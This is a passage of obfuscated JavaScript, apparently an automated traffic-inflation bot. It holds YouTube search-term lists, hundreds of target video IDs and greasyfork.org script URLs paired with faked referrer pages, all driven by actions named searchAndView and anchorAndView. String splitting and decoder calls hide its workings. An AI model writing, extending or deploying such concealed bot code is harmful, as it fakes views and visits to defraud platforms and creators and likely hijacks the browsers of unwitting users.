searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x9 * 0x22c + -0x8ee * 0x1 + -0x54a * 0x2)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x30 * -0x4e + -0x1 * 0x1bc1 + 0x1 * 0xd2b)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x4 * -0x485 + -0x1cf3 * -0x1 + -0xadc * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    V(0x15, 'xiM9') + 'M',
    '-pYA-gjkQ8' + 's',
    V(0x1c, '%(uw') + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    W(0x14) + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    V(0x16, 'VOCO') + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    V(0x6, 'wP[P') + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    W(0x19) + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    W(0x18) + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + V(0x8, 'yl0P') + 'pts/457024' + '-surviv-io' + '-xclient-b' + X(0xb),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x13) + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + X(0x4) + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x12, 'ObdD') + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
